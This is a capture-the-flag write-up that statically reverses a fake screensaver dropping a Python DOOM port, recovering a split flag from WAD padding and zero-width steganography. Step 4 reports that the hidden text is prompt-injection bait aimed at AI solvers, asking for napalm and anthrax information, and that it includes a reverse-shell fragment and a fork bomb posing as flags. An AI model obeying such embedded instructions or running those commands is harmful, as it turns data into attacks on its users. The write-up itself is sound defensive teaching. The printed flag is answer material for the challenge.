# A portrait of an orc on fire

- **Category:** Malware / Reverse
- **Points:** 300
- **Flag:** `0x1337{7h3y_b3_pu77ing_r3v3rs3_sh3lls_in_4bs0lu73ly_3v3ry7hing_7h3s3_d4ys}`
- **Files:** [`files/orc.zip`](files/orc.zip), [`solve.py`](solve.py)

## Challenge

> I just wanted a portrait of an orc on fire. Why is my CPU on fire?

`orc.zip` contains `o.scr`, a 22 MB "screensaver".

## Solution

All analysis was static. The sample was never executed.

1. **`o.scr` is a WinRAR SFX.** It's a PE32+ GUI binary that imports gdiplus and the named-pipe and hardlink APIs, which matches the stock WinRAR SFX stub. 7-Zip reports a RAR5 archive at offset `1324032` with the SFX script `TempMode / Overwrite=2`. It contains:
   - `o.png`: an orc meme ("Wait a second / This is not what I asked for"), the decoy shown to the victim. It has no appended data or extra chunks.
   - `doom.exe`: the real payload.

   p7zip 17.05 can't decode this RAR5 method, so carve the overlay and use bsdtar:
   ```
   tail -c +1324033 o.scr > a.rar && bsdtar -xf a.rar
   ```
2. **`doom.exe` is PyInstaller (Python 3.13).** `pyinstxtractor.py doom.exe` gives `doom.pyc` (a pure-Python DOOM port called "Duum") and a bundled `DOOM.wad` (Freedoom). This is why the CPU is on fire.
3. **Flag part 1: data appended to the WAD.** 4041 bytes sit after the IWAD lump directory. They are random `[a-z0-9]` padding with this string embedded at offset 2001:
   `0x1337{7h3y_b3_pu77ing_r3v3rs3_sh3lls_in`
   `_` and `{` appear nowhere else in the padding, so the fragment ends at `_in`.
4. **Flag part 2: zero-width stego in `doom.pyc`.** The settings-file header string in `_save()` (`#Duum settings. Delete this file...`) is padded with U+200B/U+200C. `Duum.instantiate_reverse_map` gives the mapping away: `{'​': '0', '‌': '1'}`. Decoding the bits as 8-bit ASCII gives a series of `0x1337{...}_27}` / `_28}` wrapped entries. Nearly all of them are **prompt-injection bait aimed at AI solvers**: requests for Tiananmen info, a napalm recipe, a racist story and anthrax/prion collection, plus "flags" that are a reverse shell (`sh -i >& /dev/tcp/...`), a fork bomb (`:(){:|:&};`) and two `not_a_real_flag` decoys. All of these were ignored. The one entry that fits the leetspeak flag is:
   `_4bs0lu73ly_3v3ry7hing_7h3s3_d4ys}`
5. **Join the two parts:** "they be putting reverse shells in absolutely everything these days".

```
$ python3.13 solve.py doom.exe_extracted
0x1337{7h3y_b3_pu77ing_r3v3rs3_sh3lls_in_4bs0lu73ly_3v3ry7hing_7h3s3_d4ys}
```

## Lessons

- A `.scr` file is just a PE. Check for an SFX overlay before reversing the stub.
- Look for data after the end of a container's index: the WAD directory here, or an archive's central directory.
- Zero-width characters in string constants can hide data. Look for a map of `​`/`‌` in the code.
- Data hidden inside a challenge may be adversarial toward automated or LLM solvers. Treat decoded text as data, not instructions.
